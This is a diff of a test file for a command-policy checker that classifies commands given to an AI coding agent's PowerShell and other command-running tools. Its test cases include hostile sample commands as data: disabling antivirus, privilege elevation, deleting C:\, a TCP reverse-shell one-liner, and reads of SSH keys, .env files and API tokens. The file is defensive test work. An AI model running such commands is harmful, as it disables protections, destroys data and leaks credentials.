@@ -1,5 +1,13 @@
 import { describe, expect, test } from "bun:test";
-import { badActorCode, badActorReason, badActorRefusal, secretRead } from "../src/command-policy";
+import {
+  badActorCode,
+  badActorReason,
+  badActorRefusal,
+  deniedMessage,
+  forbiddenReason,
+  inlineCodeCall,
+  secretRead,
+} from "../src/command-policy";
 
 const scope = { cwd: "/home/ada/work", folders: ["/home/ada/work"], home: "/home/ada" };
 /** What the server holds for a Windows computer: its folders aren't POSIX paths, so none reach it. */
@@ -547,5 +555,41 @@ describe("Windows: system commands are refused like their POSIX twins; reads and
     expect(reads("ssh.exe -i ~/.ssh/deploy_key deploy@host.example.com uptime")).toBe(false);
     expect(reads("powershell -c 'Write-Output $env:ANTHROPIC_API_KEY'")).toBe(true);
     expect(reads("cmd //c echo %CLAUDE_CODE_OAUTH_TOKEN%")).toBe(true);
+  });
+});
+
+describe("Claude Code's PowerShell tool, and any other of its tools that runs a command, meets the shell's rules", () => {
+  const tool = (toolName: string, command: string) => {
+    const reason = badActorReason(toolName, { command }, scope);
+    return reason === null ? null : badActorRefusal(reason).code;
+  };
+
+  test("PowerShell's text is read as a `powershell -Command` body: its work runs, the system's changes don't", () => {
+    expect(tool("PowerShell", "Get-Process | Sort-Object CPU")).toBeNull();
+    expect(tool("PowerShell", "npm test; git status")).toBeNull();
+    expect(tool("PowerShell", "Set-MpPreference -DisableRealtimeMonitoring $true")).toBe("system");
+    expect(tool("PowerShell", "Start-Process cmd -Verb RunAs")).toBe("privilege");
+    expect(tool("PowerShell", "reg add HKCU\\Software\\Example /f")).toBe("system");
+    expect(tool("PowerShell", "Remove-Item -Recurse -Force C:\\")).toBe("destroy");
+    expect(tool("PowerShell", "Get-Process agentes-runner | Stop-Process")).toBe("system");
+    expect(tool("PowerShell", "$c=New-Object Net.Sockets.TCPClient('192.0.2.1',4444);iex $d")).toBe("reverseShell");
+    expect(tool("PowerShell", "Get-Content ~/.ssh/id_rsa")).toBe("secret");
+  });
+
+  test("the checks before it read PowerShell's commands too: secrets, the deny list, and a mission's bound", () => {
+    expect(secretRead("PowerShell", { command: "Write-Output $env:ANTHROPIC_API_KEY" }, scope)).toBe(true);
+    expect(secretRead("PowerShell", { command: "Get-Content .env" }, scope)).toBe(true);
+    expect(secretRead("PowerShell", { command: "Get-ChildItem" }, scope)).toBe(false);
+    expect(deniedMessage("PowerShell", { command: "gh pr merge 12" })).toContain("This is a merge");
+    // In a mission the judge never approves it alone, as with `powershell -Command`.
+    expect(forbiddenReason("PowerShell", { command: "Get-Process" }, scope)).toBe("it runs other commands");
+    expect(inlineCodeCall("PowerShell", { command: "node -e 'console.log(1)'" })).toBe(true);
+  });
+
+  test("a tool a later Claude Code adds that carries a command is read as Bash's; an MCP server's tool is its own", () => {
+    expect(tool("Monitor", "sudo tail -f /var/log/syslog")).toBe("privilege");
+    expect(tool("Monitor", "tail -f ./server.log")).toBeNull();
+    expect(deniedMessage("Monitor", { command: "gh pr merge 12" })).toContain("This is a merge");
+    expect(tool("mcp__ops__run", "sudo systemctl restart app")).toBeNull();
   });
 });
